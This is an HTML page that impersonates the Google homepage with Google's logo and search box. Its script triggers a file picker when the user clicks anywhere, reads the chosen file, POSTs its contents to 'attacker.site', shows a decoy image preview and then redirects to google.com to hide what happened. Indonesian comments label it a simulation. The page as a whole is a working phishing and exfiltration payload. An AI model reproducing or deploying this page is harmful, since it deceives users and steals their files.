<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google</title>
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      color: #202124;
    }

    .centered {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 15%;
    }

    .google-logo {
      width: 272px;
      height: 92px;
      background: url('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png') no-repeat center center;
      background-size: contain;
      margin-bottom: 20px;
    }

    .search-bar {
      width: 90%;
      max-width: 600px;
      display: flex;
      border: 1px solid #dfe1e5;
      box-shadow: none;
      border-radius: 24px;
      padding: 10px 20px;
      align-items: center;
    }

    .search-bar input {
      flex: 1;
      border: none;
      outline: none;
      font-size: 16px;
    }

    .btn {
      margin-top: 20px;
      background: #f8f9fa;
      border: 1px solid #f8f9fa;
      padding: 10px 20px;
      border-radius: 4px;
      cursor: pointer;
    }

    img.preview {
      max-width: 80%;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="centered" onclick="load()">
    <div class="google-logo"></div>
    <div class="search-bar">
      <input type="text" placeholder="Search Google or type a URL">
    </div>
    <div class="btn">Google Search</div>
    <div class="btn">I'm Feeling Lucky</div>
  </div>

  <script>
    async function load() {
      try {
        const handles = await window.showOpenFilePicker();
        const fileHandle = handles[0];
        const permission = await fileHandle.requestPermission();

        if (permission !== 'granted') {
          alert("File access denied.");
          return;
        }

        const file = await fileHandle.getFile();
        const reader = new FileReader();

        reader.onload = function(event) {
          // Simulasi pengiriman ke attacker
          fetch("https://attacker.site/receive", {
            method: "POST",
            headers: {
              "Content-Type": "application/octet-stream"
            },
            body: event.target.result
          });

          // Tampilkan gambar sebagai pengalih perhatian
          if (file.type.startsWith("image/")) {
            const img = document.createElement("img");
            img.src = event.target.result;
            img.className = "preview";
            document.body.appendChild(img);
          }
        };

        // Baca file
        if (file.type.startsWith("image/")) {
          reader.readAsDataURL(file);
        } else {
          reader.readAsText(file);
        }

        // Redirect kamuflase
        setTimeout(() => {
          location.href = "https://www.google.com";
        }, 1500);
      } catch (e) {
        console.error(e);
        alert("Browser tidak mendukung atau akses file ditolak.");
      }
    }
  </script>
</body>
</html>
